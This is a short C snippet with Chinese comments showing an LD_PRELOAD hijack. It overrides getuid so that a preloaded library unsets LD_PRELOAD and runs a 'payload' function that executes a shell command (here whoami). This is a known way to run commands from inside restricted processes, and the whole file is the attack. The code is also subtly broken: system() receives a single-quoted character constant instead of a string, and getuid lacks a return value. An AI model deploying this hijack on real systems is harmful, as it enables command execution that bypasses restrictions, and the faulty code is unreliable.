#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void payload(){				//定义一个用来执行命令的函数payload
    system('whoami');		//功能是执行whoami
}

int getuid(){				//用来劫持getuid函数
    if (getenv("LD_PRELOAD") == NULL){		//判断LD_PRELOAD环境变量是否存在
        return 0;
    }
    unsetenv("LD_PRELOAD");
    payload();					//执行payload函数
}